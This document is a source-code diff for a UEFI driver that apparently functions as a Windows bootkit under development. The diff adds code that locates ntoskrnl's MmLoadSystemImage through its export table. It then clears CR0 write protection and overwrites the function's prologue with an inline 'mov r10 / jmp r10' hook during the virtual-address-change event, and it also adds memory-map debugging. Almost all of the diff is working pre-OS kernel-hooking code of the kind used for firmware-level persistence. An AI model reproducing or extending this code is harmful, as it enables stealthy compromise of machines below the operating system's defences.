@@ -17,6 +17,7 @@
 #include <Guid/EventGroup.h>
 #include <IndustryStandard/PeImage.h>
 #include <Library/IoLib.h>  
+#include <Library/UefiRuntimeServicesTableLib.h>
 
 #include "Hook.h"
 
@@ -26,13 +27,14 @@
 EFI_EXIT_BOOT_SERVICES originalExitBootServices = NULL;
 UINT64 winloadReturnAddress = 0;
 VOID * kernelBase = 0;
+UINT64 g_OriginalMmAddress = 0;
 
 /********************************************************
  * Functions
  ********************************************************/
 /**
  * TODO:
- * 1) Parse ntoskrnl PE to find any asset you want. (Write func for it)
+ * 1) Parse ntoskrnl PE to find any asset you want. (Write func for it)  done!
  * https://ferreirasc.github.io/PE-Export-Address-Table/
  * 
  * 2) Find MmLoadSystemImage hook it using r10. (inline asm, chat)
@@ -46,6 +48,8 @@ VOID * kernelBase = 0;
  * 5) Print chars using SerialWrite.
  */
 
+extern VOID HookEntry(void);
+extern UINT8 StolenPrologue[];     // Label from ASM
 
 VOID SerialWrite(CHAR8 *str)
 {
@@ -92,36 +96,33 @@ FindPattern(
     return NULL;
 }
 
-VOID* EFIAPI FindNtosExportByName(VOID* kernelBase, CHAR8* exportName)
+VOID* EFIAPI FindNtosExportByName(VOID *kernelBase , CHAR8* exportName)
 {
-    SerialWrite("kernel base: ");
-    SerialWriteHex((UINT64)kernelBase);
-    EFI_IMAGE_DOS_HEADER* DosHeader = (EFI_IMAGE_DOS_HEADER*)kernelBase;  //PE starts with Dos Headers
-    EFI_IMAGE_NT_HEADERS64* ntHeaders = (EFI_IMAGE_NT_HEADERS64*)((UINT8*)kernelBase + DosHeader->e_lfanew);
-    UINT32 exportDirRva = ntHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    SerialWrite("hello from FindNtosExportByName \n");
+    EFI_IMAGE_DOS_HEADER* DosHeaders = (EFI_IMAGE_DOS_HEADER*)kernelBase;
+    EFI_IMAGE_NT_HEADERS64* NtHeaders = (EFI_IMAGE_NT_HEADERS64*)((UINT8*)kernelBase + DosHeaders->e_lfanew);
+    UINT32 exportDirRva = NtHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
     if (exportDirRva == 0) {
         return NULL;
     }
-    EFI_IMAGE_EXPORT_DIRECTORY* exportDir = (EFI_IMAGE_EXPORT_DIRECTORY*)((UINT8*)kernelBase + exportDirRva);
-    
-    UINT32* names = (UINT32*)((UINT8*)kernelBase + exportDir->AddressOfNames);
-    UINT32* functions = (UINT32*)((UINT8*)kernelBase + exportDir->AddressOfFunctions);
-    UINT16* ordinals = (UINT16*)((UINT8*)kernelBase + exportDir->AddressOfNameOrdinals);
+    EFI_IMAGE_EXPORT_DIRECTORY* ExportDirReal = (EFI_IMAGE_EXPORT_DIRECTORY*)(exportDirRva + (UINT8*)kernelBase);
+    UINT32* names = (UINT32*)((UINT8*)kernelBase + ExportDirReal -> AddressOfNames);
+    UINT32* functions = (UINT32*)((UINT8*)kernelBase + ExportDirReal -> AddressOfFunctions);
+    UINT16* ordinals = (UINT16*)((UINT8*)kernelBase + ExportDirReal -> AddressOfNameOrdinals);
 
-    //loop on all names to find MmLoadSystemImage
-    for (UINT32 i = 0; i < exportDir->NumberOfNames; i++) {
+    for (UINT32 i = 0; i < ExportDirReal->NumberOfNames; i++)
+    {
         CHAR8* currentName = (CHAR8*)((UINT8*)kernelBase + names[i]);
-        
-        if (AsciiStrCmp(currentName, exportName) == 0) {
+
+        if (AsciiStrCmp(currentName, exportName) == 0)
+        {
             //found!!!
-            UINT32 functionRva = functions[ordinals[i]];
-            VOID* finalAddress = (VOID*)((UINT8*)kernelBase + functionRva);
-            
+            UINT32 FuncRVA = functions[ordinals[i]];
+            VOID* finalAddress = (VOID*)((UINT8*)kernelBase + FuncRVA);
             SerialWrite("Found Export: ");
             SerialWrite(exportName);
             SerialWrite(" at: ");
             SerialWriteHex((UINT64)finalAddress);
-            
             return finalAddress;
         }
     }
@@ -130,7 +131,41 @@ VOID* EFIAPI FindNtosExportByName(VOID* kernelBase, CHAR8* exportName)
     return NULL;
 }
 
+EFI_STATUS InstallPureAsmHook(VOID* TargetFunction)
+{
+    if (!TargetFunction) return EFI_INVALID_PARAMETER;
 
+    g_OriginalMmAddress = (UINT64)TargetFunction;
+    UINT8* ptr = (UINT8*)TargetFunction;
+    SerialWrite("Raw function bytes:\n");
+    for (int i = 0; i < 24; i++) {
+
+        SerialWriteHex(ptr[i]);
+
+    }
+
+    UINT8 HookPatch[13] = {
+        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, HookEntry
+        0x41, 0xFF, 0xE2                                            // jmp r10
+    };
+
+    VOID* RuntimeHookAddress = (VOID*)HookEntry; 
+
+    gRT->ConvertPointer(0, &RuntimeHookAddress); 
+    VOID* pOriginalAddr = (VOID*)&g_OriginalMmAddress;
+    gRT->ConvertPointer(0, &pOriginalAddr);
+
+    *(UINT64*)(HookPatch + 2) = (UINT64)RuntimeHookAddress;
+    UINT64 cr0 = AsmReadCr0();
+    AsmWriteCr0(cr0 & ~0x10000ULL);
+
+    CopyMem(TargetFunction, HookPatch, 13);
+
+    AsmWriteCr0(cr0);
+
+    SerialWrite("Hook installed successfully with JMP r10\n");
+    return EFI_SUCCESS;
+}
 
 VOID EFIAPI NotifySetVirtualAddressMap(EFI_EVENT Event, VOID* Context)
 {
@@ -140,12 +175,7 @@ VOID EFIAPI NotifySetVirtualAddressMap(EFI_EVENT Event, VOID* Context)
     // Sig LogOsLanchScanBase func
     UINT8 sig[] = {0x48, 0xB8, 0x77, 0xBE, 0x9F, 0x1A, 0x2F, 0xDD};
      
-    VOID * LogOsLanchScanBase = FindPattern(
-        (VOID*)winloadReturnAddress,
-        0x10000,
-        sig,
-        sizeof(sig)
-    );
+    VOID * LogOsLanchScanBase = FindPattern((VOID*)winloadReturnAddress,0x10000,sig,sizeof(sig));
 
     if (LogOsLanchScanBase) {
         SerialWrite("LogOsLanchScanBase: ");
@@ -164,12 +194,12 @@ VOID EFIAPI NotifySetVirtualAddressMap(EFI_EVENT Event, VOID* Context)
         SerialWriteHex(*((UINT32*)(kernelEntery->DllBase)));
         VOID* mmLoadAddress = FindNtosExportByName(kernelEntery->DllBase, "MmLoadSystemImage");
         if (mmLoadAddress) {
-            SerialWrite("every thing good! now hook - next step \n");        
+            SerialWrite("MmLoadSystemImage found, installing hook...\n");
+            InstallPureAsmHook(mmLoadAddress);        
         }
 }
 
 }
-
 
 EFI_STATUS EFIAPI HookedExitBootServices(EFI_HANDLE ImageHandle, UINTN MapKey)
 {
@@ -183,6 +213,48 @@ EFI_STATUS EFIAPI HookedExitBootServices(EFI_HANDLE ImageHandle, UINTN MapKey)
     return originalExitBootServices(ImageHandle, MapKey);
 }
 
+VOID DebugCheckAddress(VOID* addr)
+{
+    EFI_MEMORY_DESCRIPTOR *MemoryMap = NULL;
+    UINTN MapSize = 0;
+    UINTN MapKey;
+    UINTN DescriptorSize;
+    UINT32 DescriptorVersion;
+
+    // שלב 1: קבלת גודל
+    gBS->GetMemoryMap(&MapSize, MemoryMap, &MapKey, &DescriptorSize, &DescriptorVersion);
+
+    // שלב 2: הקצאת buffer
+    MapSize += 0x1000;
+    if (EFI_ERROR(gBS->AllocatePool(EfiBootServicesData, MapSize, (VOID**)&MemoryMap))) {
+        Print(L"AllocatePool failed\n");
+        return;
+    }
+
+    // שלב 3: קבלת ה-map בפועל
+    if (EFI_ERROR(gBS->GetMemoryMap(&MapSize, MemoryMap, &MapKey, &DescriptorSize, &DescriptorVersion))) {
+        Print(L"GetMemoryMap failed\n");
+        return;
+    }
+
+    // שלב 4: חיפוש הכתובת
+    EFI_MEMORY_DESCRIPTOR* desc = MemoryMap;
+
+    for (UINTN i = 0; i < MapSize / DescriptorSize; i++) {
+        UINT64 start = desc->PhysicalStart;
+        UINT64 end   = start + desc->NumberOfPages * 4096;
+
+        if ((UINT64)addr >= start && (UINT64)addr < end) {
+            Print(L"\n[FOUND ADDRESS]\n");
+            Print(L"Addr = %p\n", addr);
+            Print(L"Type = %d\n", desc->Type);
+            Print(L"Start = %lx End = %lx\n", start, end);
+        }
+
+        desc = (EFI_MEMORY_DESCRIPTOR*)((UINT8*)desc + DescriptorSize);
+    }
+}
+
 EFI_STATUS EFIAPI HookEntryPoint(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable)
 {
     EFI_STATUS status;
@@ -194,6 +266,11 @@ EFI_STATUS EFIAPI HookEntryPoint(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE 
     Print(L"          HookEntryPoint executed successfully!  \n");
     Print(L"================================================\n\n");
 
+    gBS = SystemTable->BootServices;
+
+    Print(L"[DEBUG] Checking HookEntry address...\n");
+    DebugCheckAddress((VOID*)HookEntry);
+    
     status = gBS->CreateEvent(EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE, TPL_NOTIFY, NotifySetVirtualAddressMap, NULL, &event);
 
     if (EFI_ERROR(status)) {
